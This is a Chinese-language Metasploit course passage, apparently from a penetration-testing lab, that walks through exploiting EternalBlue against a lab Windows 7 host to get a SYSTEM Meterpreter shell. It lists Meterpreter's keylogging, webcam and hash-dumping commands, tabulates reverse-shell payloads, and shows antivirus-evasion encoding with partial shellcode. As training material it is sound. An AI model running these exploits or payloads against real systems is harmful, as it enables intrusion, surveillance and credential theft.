<thead>
<tr>
<th><strong>范围</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>LHOST</code></td>
<td>主机的IP地址，攻击者的机器。</td>
</tr>
<tr>
<td><code>LPORT</code></td>
<td>不需要更改，只需检查端口是否已被使用。</td>
</tr>
</tbody></table>
<p>如果我们想快速查看我们的 LHOST IP 地址，我们总是可以<code>ifconfig</code>直接从 msfconsole 菜单中调用该命令。</p>
<h4 id="MSF-利用和有效负载配置"><a href="#MSF-利用和有效负载配置" class="headerlink" title="MSF - 利用和有效负载配置"></a>MSF - 利用和有效负载配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(**windows/smb/ms17_010_eternalblue**) &gt; ifconfig</span><br><span class="line"></span><br><span class="line">**[\*]** exec: ifconfig</span><br><span class="line"></span><br><span class="line">tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt; mtu 1500</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.10.14.15</span><br><span class="line"></span><br><span class="line">LHOST =&gt; 10.10.14.15</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.10.40</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 10.10.10.40</span><br></pre></td></tr></table></figure>

<p>然后，我们可以运行漏洞并查看它返回的内容。查看以下输出中的差异：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.15:4444 </span><br><span class="line">[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.10.40:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.10.40:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.10.40:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.10.40:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.10.40:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.10.40:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.10.40:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.10.40:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (201283 bytes) to 10.10.10.40</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.15:4444 -&gt; 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; whoami</span><br><span class="line"></span><br><span class="line">[-] Unknown command: whoami.</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<p>​	该提示不是 Windows 命令行提示，而是<code>Meterpreter</code>提示符。通常用于 Windows 的命令<code>whoami</code>在这里不起作用。相反，我们可以使用 Linux 等效的<code>getuid</code>. 探索<code>help</code>菜单让我们更深入地了解 Meterpreter 有效载荷的能力。</p>
<h4 id="MSF-Meterpreter-命令"><a href="#MSF-Meterpreter-命令" class="headerlink" title="MSF - Meterpreter 命令"></a>MSF - Meterpreter 命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                当前会话的背景</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    disable_unicode_encoding  Disables encoding of Unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of Unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    get_timeouts              Get the current session timeout values</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    IRB                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    migrate                   Migrate the server to another process</span><br><span class="line">    pivot                     Manage pivot listeners</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    set_timeouts              Set the current session timeout values</span><br><span class="line">    sleep                     Force Meterpreter to go quiet, then re-establish session.</span><br><span class="line">    transport                 Change the current transport mechanism</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: File system Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    cd            Change directory</span><br><span class="line">    checksum      Retrieve the checksum of a file</span><br><span class="line">    cp            Copy source to destination</span><br><span class="line">    dir           List files (alias for ls)</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    getwd         Print working directory</span><br><span class="line">    LCD           Change local working directory</span><br><span class="line">    lls           List local files</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    ls            List files</span><br><span class="line">    mkdir         Make directory</span><br><span class="line">    mv            Move source to destination</span><br><span class="line">    PWD           Print working directory</span><br><span class="line">    rm            Delete the specified file</span><br><span class="line">    rmdir         Remove directory</span><br><span class="line">    search        Search for files</span><br><span class="line">    show_mount    List all mount points/logical drives</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    arp           Display the host ARP cache</span><br><span class="line">    get proxy      Display the current proxy configuration</span><br><span class="line">    ifconfig      Display interfaces</span><br><span class="line">    ipconfig      Display interfaces</span><br><span class="line">    netstat       Display the network connections</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line">    resolve       Resolve a set of hostnames on the target</span><br><span class="line">    route         View and modify the routing table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: System Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    clearev       Clear the event log</span><br><span class="line">    drop_token    Relinquishes any active impersonation token.</span><br><span class="line">    execute       Execute a command</span><br><span class="line">    getenv        Get one or more environment variable values</span><br><span class="line">    getpid        Get the current process identifier</span><br><span class="line">    getprivs      Attempt to enable all privileges available to the current process</span><br><span class="line">    getsid        Get the SID of the user that the server is running as</span><br><span class="line">    getuid        Get the user that the server is running as</span><br><span class="line">    kill          Terminate a process</span><br><span class="line">    localtime     Displays the target system&#x27;s local date and time</span><br><span class="line">    pgrep         Filter processes by name</span><br><span class="line">    pkill         Terminate processes by name</span><br><span class="line">    ps            List running processes</span><br><span class="line">    reboot        Reboots the remote computer</span><br><span class="line">    reg           Modify and interact with the remote registry</span><br><span class="line">    rev2self      Calls RevertToSelf() on the remote machine</span><br><span class="line">    shell         Drop into a system command shell</span><br><span class="line">    shutdown      Shuts down the remote computer</span><br><span class="line">    steal_token   Attempts to steal an impersonation token from the target process</span><br><span class="line">    suspend       Suspends or resumes a list of processes</span><br><span class="line">    sysinfo       Gets information about the remote system, such as OS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: User interface Commands</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">    Command        Description</span><br><span class="line">    -------        -----------</span><br><span class="line">    enumdesktops   List all accessible desktops and window stations</span><br><span class="line">    getdesktop     Get the current meterpreter desktop</span><br><span class="line">    idle time       Returns the number of seconds the remote user has been idle</span><br><span class="line">    keyboard_send  Send keystrokes</span><br><span class="line">    keyevent       Send key events</span><br><span class="line">    keyscan_dump   Dump the keystroke buffer</span><br><span class="line">    keyscan_start  Start capturing keystrokes</span><br><span class="line">    keyscan_stop   Stop capturing keystrokes</span><br><span class="line">    mouse          Send mouse events</span><br><span class="line">    screenshare    Watch the remote user&#x27;s desktop in real-time</span><br><span class="line">    screenshot     Grab a screenshot of the interactive desktop</span><br><span class="line">    setdesktop     Change the meterpreters current desktop</span><br><span class="line">    uictl          Control some of the user interface components</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Webcam Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command        Description</span><br><span class="line">    -------        -----------</span><br><span class="line">    record_mic     Record audio from the default microphone for X seconds</span><br><span class="line">    webcam_chat    Start a video chat</span><br><span class="line">    webcam_list    List webcams</span><br><span class="line">    webcam_snap    Take a snapshot from the specified webcam</span><br><span class="line">    webcam_stream  Play a video stream from the specified webcam</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    play          play a waveform audio file (.wav) on the target system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Elevate Commands</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    get system     Attempt to elevate your privilege to that of the local system.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Password database Commands</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    hashdump      Dumps the contents of the SAM database</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Timestamp Commands</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    timestamp     Manipulate file MACE attributes</span><br></pre></td></tr></table></figure>

<p>很漂亮。从从 SAM 中提取用户哈希值到截取屏幕截图和激活网络摄像头。所有这些都是通过 Linux 风格的命令行轻松完成的。进一步探索，我们还看到了打开 shell 通道的选项。这将使我们进入实际的 Windows 命令行界面。</p>
<h4 id="MSF-Meterpreter-导航"><a href="#MSF-Meterpreter-导航" class="headerlink" title="MSF - Meterpreter 导航"></a>MSF - Meterpreter 导航</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cd Users</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line"></span><br><span class="line">Listing: C:\Users</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   8192  dir   2017-07-21 06:56:23 +0000  Administrator</span><br><span class="line">40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  All Users</span><br><span class="line">40555/r-xr-xr-x   8192  dir   2009-07-14 03:20:08 +0000  Default</span><br><span class="line">40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  Default User</span><br><span class="line">40555/r-xr-xr-x   4096  dir   2009-07-14 03:20:08 +0000  Public</span><br><span class="line">100666/rw-rw-rw-  174   fil   2009-07-14 04:54:24 +0000  desktop.ini</span><br><span class="line">40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line"></span><br><span class="line">Process 2664 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line"></span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users&gt;</span><br></pre></td></tr></table></figure>

<p><code>Channel 1</code>已创建，我们将自动放入此机器的 CLI 中。这里的通道表示我们的设备和目标主机之间的连接，它已经使用 Meterpreter Stager 和 Stage 在反向 TCP 连接（从目标主机到我们）中建立。stager 在我们的机器上被激活，以等待由目标机器上的 Stage 有效负载初始化的连接请求。</p>
<p>在某些情况下，进入目标的标准 shell 是有帮助的，但 Meterpreter 也可以在受害机器上导航和执行操作。所以我们看到命令发生了变化，但我们在系统内具有相同的权限级别。</p>
<h4 id="MSF-Windows-CMD"><a href="#MSF-Windows-CMD" class="headerlink" title="MSF-Windows CMD"></a>MSF-Windows CMD</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users&gt;dir</span><br><span class="line"></span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is A0EF-1911</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users</span><br><span class="line"></span><br><span class="line">21/07/2017  07:56    &lt;DIR&gt;          .</span><br><span class="line">21/07/2017  07:56    &lt;DIR&gt;          ..</span><br><span class="line">21/07/2017  07:56    &lt;DIR&gt;          Administrator</span><br><span class="line">14/07/2017  14:45    &lt;DIR&gt;          haris</span><br><span class="line">12/04/2011  08:51    &lt;DIR&gt;          Public</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               5 Dir(s)  15,738,978,304 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users&gt;whoami</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>

<p>让我们看看我们可以使用哪些其他类型的有效载荷。我们将研究与 Windows 操作系统相关的最常见的问题。</p>
<h2 id="有效载荷类型"><a href="#有效载荷类型" class="headerlink" title="有效载荷类型"></a>有效载荷类型</h2><p>下表包含用于 Windows 机器的最常见有效负载及其各自的描述。</p>
<table>
<thead>
<tr>
<th><strong>有效载荷</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>generic/custom</code></td>
<td>通用监听器，多用途</td>
</tr>
<tr>
<td><code>generic/shell_bind_tcp</code></td>
<td>通用监听器，多用途，普通 shell，TCP 连接绑定</td>
</tr>
<tr>
<td><code>generic/shell_reverse_tcp</code></td>
<td>通用侦听器，多用途，普通外壳，反向 TCP 连接</td>
</tr>
<tr>
<td><code>windows/x64/exec</code></td>
<td>执行任意命令 (Windows x64)</td>
</tr>
<tr>
<td><code>windows/x64/loadlibrary</code></td>
<td>加载任意 x64 库路径</td>
</tr>
<tr>
<td><code>windows/x64/messagebox</code></td>
<td>使用可自定义的标题、文本和图标通过 MessageBox 生成一个对话框</td>
</tr>
<tr>
<td><code>windows/x64/shell_reverse_tcp</code></td>
<td>普通 shell，单一负载，反向 TCP 连接</td>
</tr>
<tr>
<td><code>windows/x64/shell/reverse_tcp</code></td>
<td>普通shell，stager + stage，反向TCP连接</td>
</tr>
<tr>
<td><code>windows/x64/shell/bind_ipv6_tcp</code></td>
<td>普通外壳，stager + stage，IPv6 Bind TCP stager</td>
</tr>
<tr>
<td><code>windows/x64/meterpreter/$</code></td>
<td>Meterpreter payload + 以上变体</td>
</tr>
<tr>
<td><code>windows/x64/powershell/$</code></td>
<td>交互式 PowerShell 会话 + 以上品种</td>
</tr>
<tr>
<td><code>windows/x64/vncinject/$</code></td>
<td>VNC 服务器（反射注入）+ 以上品种</td>
</tr>
</tbody></table>
<p>渗透测试人员在安全评估期间大量使用的其他关键有效载荷是 Empire 和 Cobalt Strike 有效载荷。这些不在本课程的范围内，但您可以在我们的空闲时间随意研究它们，因为它们可以提供大量关于专业渗透测试人员如何对高价值目标进行评估的见解。</p>
<p>当然，除了这些之外，还有许多其他有效载荷。有些是针对特定设备供应商的，例如 Cisco、Apple 或 PLC。有些我们可以使用<code>msfvenom</code>. 然而，接下来，我们将研究<code>Targets</code>以及如何使用它们来影响攻击结果。</p>
<h1 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h1><hr>
<p>在 Metasploit 框架存在的 15 年中，<code>Encoders</code>它帮助使有效负载与不同的处理器架构兼容，同时帮助逃避防病毒。<code>Encoders</code>发挥改变有效载荷以在不同操作系统和体系结构上运行的作用。这些架构包括：</p>
<table>
<thead>
<tr>
<th><code>x64</code></th>
<th><code>x86</code></th>
<th><code>sparc</code></th>
<th><code>ppc</code></th>
<th><code>mips</code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><code>bad characters</code>还需要它们从有效负载中删除已知的十六进制操作码。不仅如此，以不同格式编码有效载荷也有助于如上所述的反病毒检测。然而，随着 IPS&#x2F;IDS 制造商改进了他们的保护软件处理恶意软件和病毒签名的方式，严格用于 AV 规避的编码器的使用随着时间的推移已经减少。</p>
<p>Shikata Ga Nai ( <code>SGN</code>) 是当今最常用的编码方案之一，因为它很难检测到通过其机制编码的有效载荷不再普遍无法检测到。离得很远。名称 ( <code>仕方がない</code>) 的意思是<code>It cannot be helped</code>or <code>Nothing can be done about it</code>，如果我们几年前读到这篇文章的话，这是理所当然的。但是，我们将探索其他方法来规避保护系统。<a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html">来自 FireEye 的这篇文章</a>详细介绍了 Shikata Ga Nai 之前统治其他编码器的原因和方式。</p>
<hr>
<h2 id="选择编码器"><a href="#选择编码器" class="headerlink" title="选择编码器"></a>选择编码器</h2><p>在 2015 年之前，Metasploit 框架有不同的子模块来处理负载和编码器。它们与 msfconsole 脚本分开打包，并称为<code>msfpayload</code>and <code>msfencode</code>。这两个工具位于<code>/usr/share/framework2/</code>.</p>
<p>如果我们想创建我们的自定义负载，我们可以通过 来实现<code>msfpayload</code>，但我们必须根据目标操作系统架构对其进行编码，<code>msfencode</code>然后再使用。管道将从一个命令获取输出并将其馈送到下一个命令，这将生成一个编码的有效负载，准备好发送并在目标机器上运行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b &#x27;\x00&#x27; -f perl -e x86/shikata_ga_nai</span><br><span class="line"></span><br><span class="line">[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)</span><br><span class="line"></span><br><span class="line">my $buf = </span><br><span class="line">&quot;\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9&quot; .</span><br><span class="line">&quot;\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2&quot; .</span><br><span class="line">&quot;\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd&quot; .</span><br><span class="line">&quot;\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6&quot; .</span><br><span class="line">&quot;\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36&quot; .</span><br><span class="line">&quot;\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45&quot; .</span><br><span class="line">&quot;\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc&quot; .</span><br><span class="line">&quot;\xa4\x9c\x5c\x0b\x0b\x49\xbe\x5d\x0e\xdf\xfc\x2e\xc3\x9a&quot; .</span><br><span class="line">&quot;\x3d\xd7\x82\x48\x4e\x72\x69\xb1\xfc\x34\x3e\xe2\xa8\xf9&quot; .</span><br><span class="line">&quot;\xf1\x36\x67\x2c\xc2\x18\xb7\x1e\x13\x49\x97\x12\x03\xde&quot; .</span><br><span class="line">&quot;\x85\xfe\x9e\xd4\x1d\xcb\xd4\x38\x7d\x39\x35\x6b\x5d\x6f&quot; .</span><br><span class="line">&quot;\x50\x1d\xf8\xfd\xe9\x84\x41\x6d\x60\x29\x20\x12\x08\xe7&quot; .</span><br><span 